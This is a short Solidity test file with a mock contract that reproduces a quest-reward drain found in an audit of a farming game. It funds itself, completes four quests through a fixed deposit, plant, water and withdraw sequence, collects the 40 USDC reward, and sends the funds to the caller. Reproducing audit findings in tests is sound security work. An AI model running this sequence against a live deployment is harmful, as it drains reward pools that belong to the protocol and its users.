// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IQuestToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface IQuestGameLike {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function plant(uint8 tier, uint256 amount) external returns (uint256 cropId);
    function water(uint256 cropId) external;
}

interface IQuestsLike {
    function complete(uint256 hint) external returns (uint256 quest, uint256 reward);
}

/// Test only: the quest-pool drain found in the audit. Funded by a plain transfer, the contract does quests 0-3
/// (hold USDC, lend 10, plant, water), takes their 40 USDC and sends everything back to whoever called run().
contract QuestFarmerMock {
    function run(IQuestToken usdc, IQuestGameLike game, IQuestsLike quests) external {
        usdc.approve(address(game), type(uint256).max);
        quests.complete(0);
        game.deposit(10e6);
        quests.complete(0);
        uint256 crop = game.plant(0, 1);
        quests.complete(crop);
        game.water(crop);
        quests.complete(0);
        game.withdraw(10e6);
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }
}
